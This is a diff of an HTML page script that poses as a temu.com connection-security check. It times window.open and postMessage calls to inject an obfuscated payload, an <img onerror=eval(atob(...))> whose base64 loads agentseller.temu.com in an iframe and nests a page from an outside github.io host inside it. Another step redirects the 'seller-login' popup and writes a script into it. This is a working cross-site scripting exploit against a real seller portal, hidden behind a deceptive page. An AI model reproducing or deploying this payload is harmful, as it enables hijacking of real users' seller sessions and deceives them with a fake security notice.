@@ -545,10 +545,10 @@
         document.body.appendChild(iframe);
 
         const code = `LumDaRE5fKp8yVXdv4gh19ba2d119ef165965157cddd6093ee29ac944e3a1b46bb11f6abc88`;
-        var popupWindow;
+
 
         setTimeout(() => {
-          popupWindow = window.open('', 'seller-login');
+          window.open('', 'seller-login');
         }, 6000);
 
         setTimeout(() => {
@@ -557,19 +557,19 @@
             action: 1,
             code: code
           }, "*");
-        }, 6000);
+        }, 7000);
 
         setTimeout(() => {
           iframe.contentWindow.postMessage(
             'document.write("<img src=x onerror=eval(atob(\'Y29uc3QgZD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTtkLmlubmVySFRNTD0nPGlmcmFtZSBzcmM9Imh0dHBzOi8vYWdlbnRzZWxsZXIudGVtdS5jb20vYXBpL3NlcnZlci9fc3RtIiB3aWR0aD0iNTAwIiBoZWlnaHQ9IjUwMCI+PC9pZnJhbWU+Jztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGQpO2QucXVlcnlTZWxlY3RvcigiaWZyYW1lIikub25sb2FkPWZ1bmN0aW9uKCl7dHJ5e2NvbnN0IGY9dGhpcy5jb250ZW50V2luZG93LmRvY3VtZW50LG49Zi5jcmVhdGVFbGVtZW50KCJkaXYiKTtuLmlubmVySFRNTD0nPGlmcmFtZSBzcmM9Imh0dHBzOi8vZGFzZHNhMGQ4czlhLmdpdGh1Yi5pby9kc2Fkc2Fkc2Fkc2FkYXNkc2Evbm9uLmh0bWwiIHdpZHRoPSI1MDAiIGhlaWdodD0iNTAwIj48L2lmcmFtZT4nO2YuYm9keS5hcHBlbmRDaGlsZChuKX1jYXRjaChlKXtjb25zb2xlLmVycm9yKCJBY2Nlc3MgZGVuaWVkOiBDcm9zcy1vcmlnaW4gcmVzdHJpY3Rpb24iKX19Ow==\'))>")',
             '*'
           );
-        }, 7000);
+        }, 8000);
         setTimeout(() => {
           hamid = window.open('', 'seller-login')
-          hamid.window.location = window.location.href
+          hamid.window.location = 'https://agentseller.temu.com/'
           hamid.document.write("<img src=x onerror=alert()'))>")
-        }, 8000);
+        }, 9000);
       </script>
       <div id="message" class="core-msg spacer spacer-top">temu.com needs to review the security of your connection
         before proceeding.</div>
